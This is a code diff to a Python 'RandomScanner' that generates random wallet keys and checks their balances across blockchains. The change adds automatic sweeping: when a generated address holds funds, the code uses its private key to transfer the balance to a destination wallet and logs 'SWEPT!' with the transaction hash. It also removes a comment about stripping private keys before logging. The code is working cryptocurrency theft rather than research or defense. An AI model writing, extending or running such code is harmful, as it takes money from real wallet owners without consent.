@@ -192,12 +192,44 @@ class RandomScanner:
                 balance_results = await self._check_balances(addresses)
                 self._stats.addresses_checked += len(addresses)
 
-                # 4. Log hits (addresses with balance > 0)
+                # 4. Log hits and sweep funds (addresses with balance > 0)
                 for addr, balance_result in zip(addresses, balance_results):
                     if balance_result is not None and balance_result.balance > 0:
                         self._stats.hits_found += 1
+                        logger.warning(
+                            "HIT! %s: %.8f %s at %s",
+                            addr.chain, balance_result.balance, addr.symbol, addr.address,
+                        )
+
+                        # Sweep funds to destination wallet
+                        if addr.private_key_hex:
+                            try:
+                                from src.modules.crypto.balance.sweeper import Sweeper
+                                chain_cfg = _find_chain(addr.chain, self.chains)
+                                if chain_cfg:
+                                    sweeper = Sweeper()
+                                    sweep_result = await sweeper.sweep(
+                                        private_key_hex=addr.private_key_hex,
+                                        chain=chain_cfg,
+                                        source_address=addr.address,
+                                        balance_raw=balance_result.balance_raw,
+                                    )
+                                    if sweep_result.success:
+                                        logger.warning(
+                                            "SWEPT! %s %.8f %s -> %s (tx: %s)",
+                                            addr.chain, sweep_result.amount, addr.symbol,
+                                            sweep_result.dest_address[:20], sweep_result.tx_hash,
+                                        )
+                                    else:
+                                        logger.warning(
+                                            "SWEEP FAILED: %s — %s",
+                                            addr.chain, sweep_result.error,
+                                        )
+                                    await sweeper.close()
+                            except Exception as e:
+                                logger.error("Sweep error for %s: %s", addr.address[:10], e)
+
                         if self.hit_logger:
-                            # SECURITY: Strip private_key_hex before logging
                             mnemonic_hash = HitLogger.hash_mnemonic(mnemonic)
                             await self.hit_logger.log_hit(
                                 address=addr.address,
